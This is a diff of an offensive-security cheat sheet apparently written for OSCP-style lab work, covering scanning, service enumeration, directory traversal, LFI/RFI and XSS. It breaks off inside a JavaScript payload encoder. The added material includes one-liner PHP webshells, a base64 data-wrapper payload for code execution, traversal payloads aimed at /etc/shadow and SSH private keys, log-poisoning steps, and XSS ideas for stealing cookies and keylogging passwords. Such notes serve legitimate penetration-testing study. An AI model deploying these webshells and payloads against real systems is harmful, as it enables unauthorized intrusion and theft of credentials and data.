@@ -13,70 +13,77 @@ Other great cheetsheets:
 - [3. Scanning](#3-scanning)
   - [3.1. Rustscan](#31-rustscan)
   - [3.2. Nmap](#32-nmap)
-  - [3.3. IPv6 to bypass IPv4 filters](#33-ipv6-to-bypass-ipv4-filters)
-  - [3.4. Simple Ping Scanner](#34-simple-ping-scanner)
-  - [3.5. Bash Port Scanner](#35-bash-port-scanner)
+  - [3.3. Nessus](#33-nessus)
+  - [3.4. Windows Port Scanning](#34-windows-port-scanning)
+  - [3.5. Bash Ping Scanner](#35-bash-ping-scanner)
+  - [3.6. Bash Port Scanner](#36-bash-port-scanner)
+  - [3.7. IPv6 to bypass IPv4 filters](#37-ipv6-to-bypass-ipv4-filters)
+  - [3.8. Whois](#38-whois)
 - [4. Services](#4-services)
   - [4.1. 22 - SSH/SFTP](#41-22---sshsftp)
     - [4.1.1. SSH Bruteforcing](#411-ssh-bruteforcing)
+    - [4.1.2. Disable SSH Host Key Checking](#412-disable-ssh-host-key-checking)
+    - [4.1.3. Use Legacy Key Exchange Algorithm or Cipher with SSH](#413-use-legacy-key-exchange-algorithm-or-cipher-with-ssh)
   - [4.2. 25,465,587 - SMTP/s](#42-25465587---smtps)
   - [4.3. 53 - DNS](#43-53---dns)
     - [4.3.1. DNS Zone Transfer](#431-dns-zone-transfer)
     - [4.3.2. Bruteforcing DNS Records](#432-bruteforcing-dns-records)
-  - [4.4. 80,443 - HTTP(s)](#44-80443---https)
-    - [4.4.1. Web Scanning/Enumeration](#441-web-scanningenumeration)
-    - [4.4.2. Web Bruteforcing](#442-web-bruteforcing)
-    - [4.4.3. PHP Exploitation](#443-php-exploitation)
-      - [4.4.3.1. LFI/RFI](#4431-lfirfi)
-      - [4.4.3.2. One-liner PHP Webshells](#4432-one-liner-php-webshells)
-    - [4.4.4. WordPress](#444-wordpress)
-  - [4.5. 88/749 Kerberos](#45-88749-kerberos)
-  - [4.6. 110,995 - POP](#46-110995---pop)
-  - [4.7. 111 - RPCbind](#47-111---rpcbind)
-  - [4.8. 119 - NNTP](#48-119---nntp)
-  - [4.9. 135 - MSRPC](#49-135---msrpc)
-  - [4.10. 139,445 - SMB](#410-139445---smb)
-    - [4.10.1. SMB Bruteforcing](#4101-smb-bruteforcing)
-    - [4.10.2. Interacting with SMB](#4102-interacting-with-smb)
-  - [4.11. 161,162,10161,10162 - SNMP](#411-1611621016110162---snmp)
-    - [4.11.1. Exploring MIBs with `snmptranslate`](#4111-exploring-mibs-with-snmptranslate)
-    - [4.11.2. RCE with SNMP](#4112-rce-with-snmp)
-  - [4.12. 1433 - MSSQL](#412-1433---mssql)
-    - [4.12.1. MSSQL Bruteforcing](#4121-mssql-bruteforcing)
-    - [4.12.2. MSSQL Interaction](#4122-mssql-interaction)
-    - [4.12.3. MSSQL Command Execution](#4123-mssql-command-execution)
-  - [4.13. 2049 - NFS](#413-2049---nfs)
-  - [4.14. 3306 - MySQL Enumeration](#414-3306---mysql-enumeration)
-    - [4.14.1. MySQL UDF Exploit](#4141-mysql-udf-exploit)
-    - [4.14.2. Grabbing MySQL Passwords](#4142-grabbing-mysql-passwords)
-    - [4.14.3. Useful MySQL Files](#4143-useful-mysql-files)
-  - [4.15. 5900 - VNC](#415-5900---vnc)
-  - [4.16. 27017 - MongoDB](#416-27017---mongodb)
-    - [4.16.1. Exploiting NoSQL Injection](#4161-exploiting-nosql-injection)
-  - [4.17. Amazon Web Services (AWS) S3 Buckets](#417-amazon-web-services-aws-s3-buckets)
-    - [4.17.1. AWS Identity and Access Management (IAM)](#4171-aws-identity-and-access-management-iam)
-      - [4.17.1.1. IAM Access Keys](#41711-iam-access-keys)
-      - [4.17.1.2. Conducting Reconnaissance with IAM](#41712-conducting-reconnaissance-with-iam)
-      - [4.17.1.3. AWS ARNs](#41713-aws-arns)
+  - [4.4. 79 - Finger](#44-79---finger)
+  - [4.5. 80,443 - HTTP(s)](#45-80443---https)
+    - [4.5.1. Web Scanning/Enumeration](#451-web-scanningenumeration)
+    - [4.5.2. Web Bruteforcing](#452-web-bruteforcing)
+    - [4.5.5. Directory Traversal](#455-directory-traversal)
+    - [4.5.3.1. LFI/RFI](#4531-lfirfi)
+      - [4.5.3.2. One-liner PHP Webshells](#4532-one-liner-php-webshells)
+    - [4.5.4. Cross-Site Scripting (XSS)](#454-cross-site-scripting-xss)
+    - [4.5.6. WordPress](#456-wordpress)
+    - [4.5.7. Drupal](#457-drupal)
+    - [4.5.8. Joomla](#458-joomla)
+  - [4.6. 88/749 Kerberos](#46-88749-kerberos)
+  - [4.7. 110,995 - POP](#47-110995---pop)
+  - [4.8. 111 - RPCbind](#48-111---rpcbind)
+  - [4.9. 119 - NNTP](#49-119---nntp)
+  - [4.10. 135 - MSRPC](#410-135---msrpc)
+  - [4.11. 139,445 - SMB](#411-139445---smb)
+    - [4.11.1. SMB Bruteforcing](#4111-smb-bruteforcing)
+    - [4.11.2. Interacting with SMB](#4112-interacting-with-smb)
+  - [4.12. 161,162,10161,10162 - SNMP](#412-1611621016110162---snmp)
+    - [4.12.1. Exploring MIBs with `snmptranslate`](#4121-exploring-mibs-with-snmptranslate)
+    - [4.12.2. RCE with SNMP](#4122-rce-with-snmp)
+  - [4.13. 389 - LDAP](#413-389---ldap)
+  - [4.14. 1433 - MSSQL](#414-1433---mssql)
+    - [4.14.1. MSSQL Bruteforcing](#4141-mssql-bruteforcing)
+    - [4.14.2. MSSQL Interaction](#4142-mssql-interaction)
+    - [4.14.3. MSSQL Command Execution](#4143-mssql-command-execution)
+  - [4.15. 2049 - NFS](#415-2049---nfs)
+  - [4.16. 3306 - MySQL Enumeration](#416-3306---mysql-enumeration)
+    - [4.16.1. MySQL UDF Exploit](#4161-mysql-udf-exploit)
+    - [4.16.2. Grabbing MySQL Passwords](#4162-grabbing-mysql-passwords)
+    - [4.16.3. Useful MySQL Files](#4163-useful-mysql-files)
+  - [4.17. 3389 - RDP](#417-3389---rdp)
+  - [4.18. 5900 - VNC](#418-5900---vnc)
+  - [4.19. 27017 - MongoDB](#419-27017---mongodb)
+    - [4.19.1. Exploiting NoSQL Injection](#4191-exploiting-nosql-injection)
+  - [4.20. Amazon Web Services (AWS) S3 Buckets](#420-amazon-web-services-aws-s3-buckets)
+    - [4.20.1. AWS Identity and Access Management (IAM)](#4201-aws-identity-and-access-management-iam)
+      - [4.20.1.1. IAM Access Keys](#42011-iam-access-keys)
+      - [4.20.1.2. Conducting Reconnaissance with IAM](#42012-conducting-reconnaissance-with-iam)
+      - [4.20.1.3. AWS ARNs](#42013-aws-arns)
 - [5. Exploitation](#5-exploitation)
   - [5.1. Searchsploit](#51-searchsploit)
   - [5.2. Password Bruteforcing and Cracking](#52-password-bruteforcing-and-cracking)
     - [5.2.1. Cracking with John The Ripper](#521-cracking-with-john-the-ripper)
     - [5.2.2. Cracking with Hashcat](#522-cracking-with-hashcat)
     - [5.2.3. Zip File Password Cracking](#523-zip-file-password-cracking)
-  - [5.3. Port Knocking](#53-port-knocking)
-  - [5.4. Buffer Overflows](#54-buffer-overflows)
-  - [5.5. Reverse Shells](#55-reverse-shells)
-    - [5.5.1. Covering your tracks](#551-covering-your-tracks)
-    - [5.5.2. Running a detached/daeminized process on Linux](#552-running-a-detacheddaeminized-process-on-linux)
-  - [5.6. Encryption](#56-encryption)
-    - [5.6.1. Create self-signed SSL/TLS certificate](#561-create-self-signed-ssltls-certificate)
-    - [5.6.2. Decrypting files with GPG](#562-decrypting-files-with-gpg)
+  - [5.3. Buffer Overflows](#53-buffer-overflows)
+  - [5.4. Reverse Shells](#54-reverse-shells)
+    - [5.4.1. Covering your tracks](#541-covering-your-tracks)
+    - [5.4.2. Running a detached/daeminized process on Linux](#542-running-a-detacheddaeminized-process-on-linux)
 - [6. Windows](#6-windows)
   - [6.1. Basic Windows Post-Exploit Enumeration](#61-basic-windows-post-exploit-enumeration)
   - [6.2. Using Saved Windows Credentials](#62-using-saved-windows-credentials)
   - [6.3. Check Windows File Permissions](#63-check-windows-file-permissions)
-  - [6.4. Antivirus & Firewall Evasion](#64-antivirus--firewall-evasion)
+  - [6.4. Antivirus \& Firewall Evasion](#64-antivirus--firewall-evasion)
     - [6.4.1. Windows AMSI Bypass](#641-windows-amsi-bypass)
     - [6.4.2. Turn off Windows Firewall](#642-turn-off-windows-firewall)
     - [6.4.3. Turn off Windows Defender](#643-turn-off-windows-defender)
@@ -90,7 +97,7 @@ Other great cheetsheets:
     - [6.7.2. Windows Token Impersonation with PrintSpoofer](#672-windows-token-impersonation-with-printspoofer)
     - [6.7.3. Windows Service Escalation - Registry](#673-windows-service-escalation---registry)
   - [6.8. Compiling Windows Binaries on Linux](#68-compiling-windows-binaries-on-linux)
-  - [6.9. Windows Passwords & Hashes](#69-windows-passwords--hashes)
+  - [6.9. Windows Passwords \& Hashes](#69-windows-passwords--hashes)
     - [6.9.1. Finding Windows Passwords in Files](#691-finding-windows-passwords-in-files)
       - [6.9.1.1. Files with Passwords on Windows](#6911-files-with-passwords-on-windows)
     - [6.9.2. Windows Passwords in Registry](#692-windows-passwords-in-registry)
@@ -119,18 +126,19 @@ Other great cheetsheets:
   - [7.3. Watching for Linux Process Changes](#73-watching-for-linux-process-changes)
   - [7.4. Adding root user to /etc/shadow or /etc/passwd](#74-adding-root-user-to-etcshadow-or-etcpasswd)
   - [7.5. Escalating via sudo binaries](#75-escalating-via-sudo-binaries)
-  - [7.6. LD_PRELOAD and LD_LIBRARY_PATH](#76-ld_preload-and-ld_library_path)
+  - [7.6. LD\_PRELOAD and LD\_LIBRARY\_PATH](#76-ld_preload-and-ld_library_path)
   - [7.7. SUID binaries](#77-suid-binaries)
   - [7.8. Using NFS for Privilege Escalation](#78-using-nfs-for-privilege-escalation)
   - [7.9. Linux Kernel Exploits](#79-linux-kernel-exploits)
     - [7.9.1. Dirty Cow Linux Privesc](#791-dirty-cow-linux-privesc)
   - [7.10. Linux Files of Interest](#710-linux-files-of-interest)
   - [7.11. Data Wrangling on Linux](#711-data-wrangling-on-linux)
-    - [7.11.1. Awk & Sed](#7111-awk--sed)
+    - [7.11.1. Awk \& Sed](#7111-awk--sed)
   - [7.12. Linux Persistence](#712-linux-persistence)
     - [7.12.1. Grant passwordless sudo access](#7121-grant-passwordless-sudo-access)
     - [7.12.2. Setting SUID bit](#7122-setting-suid-bit)
 - [8. Loot](#8-loot)
+  - [Sensitive Files](#sensitive-files)
   - [8.1. File Transfers](#81-file-transfers)
     - [8.1.1. Netcat transfer](#811-netcat-transfer)
     - [8.1.2. Curl transfers](#812-curl-transfers)
@@ -153,11 +161,14 @@ Other great cheetsheets:
   - [9.8. Bending with chisel](#98-bending-with-chisel)
   - [9.9. Bending with netcat](#99-bending-with-netcat)
 - [10. Miscellaneous](#10-miscellaneous)
-  - [10.1. Disable SSH Host Key Checking](#101-disable-ssh-host-key-checking)
-  - [10.2. Use Legacy Key Exchange Algorithm or Cipher with SSH](#102-use-legacy-key-exchange-algorithm-or-cipher-with-ssh)
-  - [10.3. Convert text to Windows UTF-16 format on Linux](#103-convert-text-to-windows-utf-16-format-on-linux)
-  - [10.4. Extract UDP pcap packet payload data](#104-extract-udp-pcap-packet-payload-data)
-  - [10.5. Execute Shellcode from Bash](#105-execute-shellcode-from-bash)
+  - [10.1. Port Knocking](#101-port-knocking)
+  - [10.2. Convert text to Windows UTF-16 format on Linux](#102-convert-text-to-windows-utf-16-format-on-linux)
+  - [10.3. Extract UDP pcap packet payload data](#103-extract-udp-pcap-packet-payload-data)
+  - [10.4. Execute Shellcode from Bash](#104-execute-shellcode-from-bash)
+  - [10.5. Encryption](#105-encryption)
+    - [10.5.1. Create self-signed SSL/TLS certificate](#1051-create-self-signed-ssltls-certificate)
+    - [10.5.2. Decrypting files with GPG](#1052-decrypting-files-with-gpg)
+  - [10.6. Validating Checksums](#106-validating-checksums)
 
 # 3. Scanning
 
@@ -168,7 +179,7 @@ script scanning on those ports.
 
 ```sh
 VICTIM_IP=VICTIM_IP
-sudo rustscan --ulimit 5000 -a $VICTIM_IP -- -v -n -Pn --script "default,safe,vuln" -sV -oA all-ports
+sudo rustscan --ulimit 5000 -a $VICTIM_IP -- -v -n -Pn --script "default,safe,vuln" -sV -oA tcp-all
 ```
 
 ## 3.2. Nmap
@@ -194,9 +205,99 @@ sudo nmap -n -v -sU -T4 --top-ports=20 --reason --open -oA nmap/udp-top20 $VICTI
 # specifying safe and wildcard ftp-* scripts
 # logic: and, or, not all work. "," is like "or"
 nmap --script="safe and ftp-*" -v -n -p 21 -oA nmap/safe-ftp $VICTIM_IP
+
+# to get help on scripts:
+nmap --script-help="ftp-*"
 ```
 
-## 3.3. IPv6 to bypass IPv4 filters
+Nmap Services file lists most common ports by frequency:
+
+```sh
+cat /usr/share/nmap/nmap-services
+```
+
+The nmap scripts are found in the directory `/usr/share/nmap/scripts`.
+
+If you add a script to that directory (that you download from the internet, for example), then you must update the `script.db` by running:
+
+```sh
+sudo nmap --script-updatedb
+```
+
+
+
+## 3.3. Nessus
+
+First, manually install Nessus on Kali from the `.deb` file. It's not in the `apt` repo.
+
+[Installation Instructions](https://www.tenable.com/blog/getting-started-with-nessus-on-kali-linux)
+
+```sh
+# ensure Nessus is started
+sudo systemctl start nessusd.service
+```
+
+Browse to **https://127.0.0.1:8834** and accept the self-signed SSL cert. Set up free Nessus Essentials license and complete setup prompts. Also create an admin username and password.
+
+Create a New Scan, and navigate the GUI to configure it. The major scan templates are grouped under Discover, Vulnerability, and Compliance.
+
+Nessus is slow and not allowed on the OSCP exam, so this is mostly just for awareness.
+
+
+
+
+## 3.4. Windows Port Scanning
+
+This is a way to live off the land in Windows and perform a port scan.
+
+```powershell
+# perform full TCP connection to test if port open
+Test-NetConnection -Port 445 192.168.50.151
+
+# scanning multiple ports
+1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
+```
+
+## 3.5. Bash Ping Scanner
+
+Pings all hosts in a /24 subnet. Provide any IP address in the subnet as arg.
+
+```sh
+#!/bin/bash
+addr=${1:-10.1.1.0}
+subnet="${addr%.*}"
+for i in {1..254}; do
+  host="$subnet.$i"
+  ping -c1 -w1 $subnet.$i >& /dev/null && echo "$host UP ++++" || echo "$host down" &
+  sleep 0.1 || break  # lets you Ctrl+C out of loop
+done
+wait $(jobs -rp)
+echo "Done"
+```
+
+And here's a one-liner to do it in windows:
+
+```bat
+:: note: meant to be copy-pasted, not in .bat script (%i vs %%i)
+for /L %i in (1,1,255) do @ping -n 1 -w 2 10.2.2.%i | findstr "Reply"
+```
+
+## 3.6. Bash Port Scanner
+
+Scans all 65535 ports of a single host. Provide host IP as arg. Only works on Linux systems using bash!
+
+```sh
+#!/bin/bash
+host=${1}
+for port in {1..65535}; do
+  timeout .5 bash -c "(echo -n > /dev/tcp/$host/$port) >& /dev/null" &&
+    echo "port $port is open" &
+done
+wait $(jobs -rp)
+echo "Done"
+```
+
+## 3.7. IPv6 to bypass IPv4 filters
 
 Sometimes if you see `filtered` on an nmap scan, the filter may only be applied on IPv4, but not IPv6. Try scanning it again using the host's IPv6 address.
 
@@ -235,44 +336,21 @@ ip = mac.ipv6(IPAddress('fe80::'))
 print('{ip}%{iface}'.format(ip=ip, iface=\"$IFACE\"))"
 ```
 
-## 3.4. Simple Ping Scanner
 
-Pings all hosts in a /24 subnet. Provide any IP address in the subnet as arg.
+## 3.8. Whois
 
-```sh
-#!/bin/bash
-addr=${1:-10.1.1.0}
-subnet="${addr%.*}"
-for i in {1..254}; do
-  host="$subnet.$i"
-  ping -c1 -w1 $subnet.$i >& /dev/null && echo "$host UP ++++" || echo "$host down" &
-  sleep 0.1 || break  # lets you Ctrl+C out of loop
-done
-wait $(jobs -rp)
-echo "Done"
-```
-
-And here's a one-liner to do it in windows:
-
-```bat
-:: note: meant to be copy-pasted, not in .bat script (%i vs %%i)
-for /L %i in (1,1,255) do @ping -n 1 -w 2 10.2.2.%i | findstr "Reply"
-```
-
-## 3.5. Bash Port Scanner
-
-Scans all 65535 ports of a single host. Provide host IP as arg. Only works on Linux systems using bash!
+Perform `whois` lookups to get information about a domain name, such as the name server and registrar.
 
 ```sh
-#!/bin/bash
-host=${1}
-for port in {1..65535}; do
-  timeout .5 bash -c "(echo -n > /dev/tcp/$host/$port) >& /dev/null" &&
-    echo "port $port is open" &
-done
-wait $(jobs -rp)
-echo "Done"
+whois megacorpone.com
+
+# optionally specify server to use for whois lookup
+whois megacorpone.com -h $WHOIS_SERVER
+
+# perform a reverse lookup
+whois 38.100.193.70
 ```
+
 
 # 4. Services
 
@@ -303,6 +381,39 @@ ncrack -p 22 --user root -P passwords.txt $VICTIM_IP [-T 5]
 medusa -u root -P 500-worst-passwords.txt -h $VICTIM_IP -M ssh
 ```
 
+### 4.1.2. Disable SSH Host Key Checking
+
+Put this at the top of your `~/.ssh/config` to disable it for all hosts:
+
+```
+Host *
+   StrictHostKeyChecking no
+   UserKnownHostsFile /dev/null
+```
+
+or use these flags with ssh: `-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null`
+
+### 4.1.3. Use Legacy Key Exchange Algorithm or Cipher with SSH
+
+If you try to ssh onto a host and get an error like:
+
+```
+Unable to negotiate with 10.11.1.252 port 22000: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
+```
+
+You can get around this by adding the `-oKexAlgorithms=+diffie-hellman-group1-sha1` flag to your ssh command. Be sure to pick one of the algorithms listed in their offer.
+
+You can also specify the `KexAlgorithms` variable in the ssh-config file.
+
+Similarly, if you get an error like:
+
+```
+Unable to negotiate with 10.11.1.115 port 22: no matching cipher found. Their offer: aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,aes192-cbc,aes256-cbc
+```
+
+You can get around this by adding the `-c aes256-cbc` flag to your ssh command. Again, be sure to use one of the ciphers listed in their offer.
+
+
 ## 4.2. 25,465,587 - SMTP/s
 
 ```sh
@@ -325,6 +436,12 @@ nmap -n -v -p25 --script="smtp-enum-users" -oA nmap/smtp-users $VICTIM_IP
 # smtp-user-enum lets you check specific usernames, add a domain, and
 # specify the mode (EXPN, VRFY, RCPT) for validation
 smtp-user-enum -M MODE -U users.txt -D DOMAIN -t $VICTIM_IP
+```
+
+Enabling Telnet client on Windows (to allow SMTP interaction, requires Admin rights):
+
+```bat
+dism /online /Enable-Feature /FeatureName:TelnetClient
 ```
 
 Other ideas:
@@ -359,6 +476,18 @@ fierce --domain domain.tld
 
 # dig zone xfer, note "@" before nameserver
 dig @ns1.domain.tld -t axfr domain.tld
+
+# get DNS records by type (MX in this case)
+host -t MX example.com
+```
+
+DNS Queries on Windows:
+
+```bat
+nslookup www.example.com
+
+:: Advanced, specify record type and nameserver
+nslookup -type=TXT www.example.com ns1.nameserver.com
 ```
 
 **Common record types**:
@@ -398,15 +527,32 @@ dnsenum --noreverse -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top
 
 # using nmap dns-brute script
 nmap -vv -Pn -T4 -p 53 --script dns-brute domain.tld
+
+# scan through list of subdomains/hostnames using just bash
+for subdomain in $(cat list.txt); do host $subdomain.example.com; done
+
+# scan through IP space doing reverse DNS lookups
+for oct in $(seq 1 254); do host 192.168.69.$oct; done | grep -v "not found"
 ```
 
-## 4.4. 80,443 - HTTP(s)
+
+## 4.4. 79 - Finger
+
+If the `finger` service is running, it is possible to enumerate usernames.
+
+```sh
+nmap -vvv -Pn -sC -sV -p79 $VICTIM_IP
+```
+
+
+## 4.5. 80,443 - HTTP(s)
 
 Scans to run every time:
 
 ```bash
 # enumerate version info of tech stack, find emails, domains, etc.
 whatweb -v -a3 --log-verbose whatweb.txt $VICTIM_IP
+# to passively accomplish the same thing on a real site, use https://www.wappalyzer.com/
 
 # Gobuster directory/file discovery
 # Other extensions to add: asp,aspx,jsp,cgi,pl,py,sh,
@@ -421,18 +567,15 @@ nikto -o nikto.txt --maxtime=180s -C all -h $VICTIM_IP
 Checklist:
 
 - [ ] Check `searchsploit` for vulns in server software, web stack
-
-- [ ] Check `robots.txt` for directories/files of interest
-
+- [ ] Check `/robots.txt` for directories/files of interest
+- [ ] Check `/sitemap.xml` for directories/files of interest
 - [ ] Inspect HTML comments/source for juicy info
   - [ ] secrets/passwords
   - [ ] directories of interest
   - [ ] software libraries in use
-
+- [ ] Inspect SSL certs for DNS subdomains and emails
 - [ ] Attempt login with default/common creds
-
-- [ ] Test for SQL/NoSQL injection using "bad" chars
-
+- [ ] Test for SQL/NoSQL injection using "bad" chars:
   ```
   '
   "
@@ -449,23 +592,18 @@ Checklist:
   %
   %%
   ```
-
 - [ ] Test for command injection
-
   - [ ] separator characters: `; | & || &&`
   - [ ] help msg:  `-h`, `--help`, `/?`
   - [ ] perl injection when opening file:  `echo Injected|`
   - [ ] UNIX subshells: `$(cmd)`, `>(cmd)` and backticks
-
 - [ ] Test for LFI/RFI, especially in URL query params
-
-- [ ] Test for XSS on all input fields, URL query params:
-
+- [ ] Test for XSS on all input fields, URL query params, and HTTP Headers:
   - [ ] Check what remains after filtering applied on input: `'';!--"<XSS>=&{()}`
   - [ ] Try variations of `<script>alert(1)</script>`
 
 
-### 4.4.1. Web Scanning/Enumeration
+### 4.5.1. Web Scanning/Enumeration
 
 Whatweb shows details about tech stacks in use by server, email addresses found, etc.
 
@@ -484,7 +622,7 @@ Web Directory discovery with Gobuster:
 ```sh
 # Gobuster
 ulimit -n 8192 # prevent file access error during scanning
-gobuster dir -ezqrkw /usr/share/dirb/wordlists/common.txt -t 100 -x "txt,htm,html,php,asp,aspx,jsp,cgi,pl,py" -o gobuster-common.txt -u http://$VICTIM_IP
+gobuster dir -ezqrkw /usr/share/dirb/wordlists/common.txt -t 100 -x "txt,htm,html,xhtml,php,asp,aspx,jsp,do,cgi,pl,py,conf" -o gobuster-common.txt -u http://$VICTIM_IP
 # -e / --expanded = Expanded mode, print full URLs (easy for clicking to open)
 # -z / --no-progress = no progress displayed
 # -q / --quiet = quiet mode (no banner)
@@ -500,6 +638,14 @@ gobuster dir -ezqrkw /usr/share/dirb/wordlists/common.txt -t 100 -x "txt,htm,htm
 
 # adding a proxy to gobuster:
 # --proxy socks5://127.0.0.1:1080
+
+# you can use patterns with the wordlist to fuzz for API endpoints.
+# -p / --pattern <pattern-file>
+# where pattern files contain placeholder {GOBUSTER} for substitution in wordlist,
+# one pattern per line
+# Example:
+# {GOBUSTER}/v1
+# {GOBUSTER}/v2
 ```
 
 Web Directory discovery with ffuf (great for scanning through SOCKS proxy):
@@ -513,18 +659,24 @@ ffuf.json | python -m json.tool
 
 Other web discovery tools:
 
-```bash
-# fast scanner written in Rust
-feroxbuster
+- feroxbuster - fast scanner written in Rust
+- dirb
+- dirbuster
+- wfuzz
 
-dirb
 
-dirbuster
+Good wordlists to try:
+- /usr/share/dirb/wordlists/small.txt
+- /usr/share/dirb/wordlists/common.txt
+- /usr/share/dirb/wordlists/catala.txt
+- /usr/share/dirb/wordlists/big.txt
+- /usr/share/dirbuster/wordlists/directory-list-1.0.txt
+- /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
+- /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 
-wfuzz
-```
 
-### 4.4.2. Web Bruteforcing
+
+### 4.5.2. Web Bruteforcing
 
 Hydra help/usage for specific module:
 
@@ -555,11 +707,113 @@ HTTP BasicAuth (GET request):
 hydra -L users.txt -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt "http-get://$VICTIM_IP/loginpage:A=BASIC" http-get
 ```
 
-### 4.4.3. PHP Exploitation
 
-#### 4.4.3.1. LFI/RFI
 
-Some handy PHP wrappers:
+### 4.5.5. Directory Traversal
+
+On Linux, `/var/www/html/` is commonly the webroot. Other Linux options: `/usr/share/nginx/www` or `/usr/share/nginx/html`.
+
+On Windows IIS, it's `C:\inetpub\wwwroot\`.
+
+Sometimes you can read sensitive files by changing the URL query params to point
+to a file using the relative path.
+
+Example:
+
+```
+https://example.com/cms/login.php?language=en.html
+```
+
+Here, `en.html` appears to be a file in the `/cms/` directory under the webroot.
+We can try changing `en.html` to `../../../../etc/passwd` to see if it lets us
+view the file.
+
+Things to try when testing for traversal vuln:
+- Add extra `../` to ensure you make it all the way to the filesystem root.
+- Use backslashes (`\`) instead of forward slashes (`/`), especially on Windows.
+- URL encode the `../` -> `%2E%2E%2F` to bypass filters
+- Double-encode the `../` -> `%252E%252E%252F`; IIS 5.0 and earlier
+- UTF-8 encode the `../` -> `%C0%AE%C0%AE%2F` (`%c0%ae` is `.`); [cve2022-1744][cve2022-1744]
+- Use `....//` instead of `../` to bypass filters
+- Append null byte (`%00`) if you suspect file extension is getting added
+- Check out [DotDotPwn](https://github.com/wireghoul/dotdotpwn) fuzzing tool.
+
+When using `curl` to test, you may need to include the `--path-as-is` flag:
+
+```sh
+curl --path-as-is http://localhost/?page=/../../../../etc/passwd
+```
+
+[cve2022-1744]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1744
+
+Files to try:
+- `/etc/passwd`
+- `/etc/shadow` if permissions allow
+- `C:\Windows\System32\drivers\etc\hosts` - good to test traversal vuln
+- `.ssh/id_rsa` files under user home dir (after seeing in `/etc/passwd`)
+- config files:
+  - `C:\inetpub\wwwroot\web.config` - on IIS server
+  - `/usr/local/etc/apache22/httpd.conf`
+  - `/etc/apache2/apache2.conf`
+  - `grep CustomLog /etc/httpd/conf/httpd.conf`
+- log files:
+  - `C:\inetpub\logs\LogFiles\W3SVC1\` and `\W3SVC2\` and `\W3SVC3` and `\HTTPERR\`
+  - `C:\xampp\apache\logs\access.log` and `C:\xampp\apache\logs\error.log`
+  - RHEL/CentOS/Fedora - `/var/log/httpd/access_log` and `/error_log`
+  - Debian/Ubuntu - `/var/log/apache2/access.log` and `/error.log`
+  - FreeBSD - `/var/log/httpd-access.log` and `/httpd-error.log`
+
+
+More Windows log and config paths [here](https://techcommunity.microsoft.com/t5/iis-support-blog/collect-basics-configuration-and-logs-when-troubleshooting-iis/ba-p/830927).
+
+
+
+
+### 4.5.3.1. LFI/RFI
+
+Local File Inclusion is basically code execution that requires directory traversal.
+LFI/RFI can be leveraged with PHP (`.php`, most common), Perl (`.pl`), Active
+Server Pages (`.asp`), Active Server Pages Extended (`.aspx`), Java Server
+Pages (`.jsp`), and even (rarely) Node.js.
+
+You can get code execution by poisoning local files, including log files and
+PHP session files with PHP code. Access logs typically have User-Agent in them,
+which we can use to inject malicious PHP code.
+
+Common log and PHP session file locations:
+
+- `/var/log/apache2/access.log` - Debian/Ubuntu
+- `/var/log/apache2/access.log` - RHEL/CentOS/Fedora
+- `/var/log/httpd-access.log` - FreeBSD
+- `C:\xampp\apache\logs\access.log` - Windows w/ XAMPP
+- c:\Windows\Temp
+- /tmp/
+- /var/lib/php5
+- /var/lib/php/session
+
+Default session filename: `sess_<SESSION_ID>`
+(grab SESSION_ID from your cookies in the browser)
+
+The following are some Linux system files that have sensitive information that
+are good to try to grab when you have an LFI vulnerability.
+
+```
+/etc/passwd
+/etc/shadow
+/etc/group
+/etc/hosts
+/etc/issue
+/etc/motd
+/etc/mysql/my.cnf
+/proc/self/environ
+/proc/version
+/proc/cmdline
+/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the file descriptor)
+```
+
+
+
+Some handy PHP wrappers to grab file contents:
 [PHP Documentation: Wrappers](https://www.php.net/manual/en/wrappers.php)
 
 Using php-wrapper with 'filter' to grab local files:
@@ -627,53 +881,87 @@ data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls
 # Also try bypassing filters with ....// instead of ../
 ```
 
-You can get code execution by poisoning local files, including log files and
-PHP session files with PHP code.
-
-Common PHP sessions file locations:
-
-- c:\Windows\Temp
-- /tmp/
-- /var/lib/php5
-- /var/lib/php/session
-
-Default session filename: `sess_<SESSION_ID>`
-(grab SESSION_ID from your cookies in the browser)
-
-The following are some Linux system files that have sensitive information that
-are good to try to grab when you have an LFI vulnerability.
-
-```
-/etc/issue
-/etc/passwd
-/etc/shadow
-/etc/group
-/etc/hosts
-/etc/motd
-/etc/mysql/my.cnf
-/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the file descriptor)
-/proc/self/environ
-/proc/version
-/proc/cmdline
-```
 
 
-#### 4.4.3.2. One-liner PHP Webshells
+#### 4.5.3.2. One-liner PHP Webshells
 
 Simple one-liner web shells for when you can drop/modify a php file:
 
 ```php
-<?php echo passthru($_GET['cmd']); ?>
+<?php system($_GET['cmd']); ?>
 
 <?php echo exec($_POST['cmd']); ?>
 
 <?php echo shell_exec($_REQUEST['cmd']); ?>
 
-<?php system($_GET['cmd']); ?>
-
+<?php echo passthru($_GET['cmd']); ?>
 ```
 
-### 4.4.4. WordPress
+Kali has more webshells here: `/usr/share/webshells`, and I have some in the [tools](tools) directory
+
+
+
+### 4.5.4. Cross-Site Scripting (XSS)
+
+In all input fields, URL query parameters, and HTTP request headers that get transformed into page content, try the following:
+
+- [ ] Check what remains after any filtering is applied on input: `'';!--"<XSS>=&{()}`
+- [ ] Try variations of `<script>alert(1)</script>`
+
+
+
+If you can get XSS working, consider possible vectors, especially against admin users:
+
+- [ ] Steal cookies, authentication (OAuth) tokens, and other sensitive data
+- [ ] Key-log password entry on login page
+- [ ] Perform Cross-Site Request Forgery (CSRF) using victim's/Admin's session (may need to steal token/nonce). Maybe create a new admin user or change admin password?
+
+
+
+When injecting XSS javascript payload, you may may want to ensure no characters get filtered. An easy way to ensure that is to encode the payload as Unicode code points.
+
+```javascript
+// Use the following code in your browser's console to encode the payload as Unicode code points.
+function encode_javascript(minified_js) {
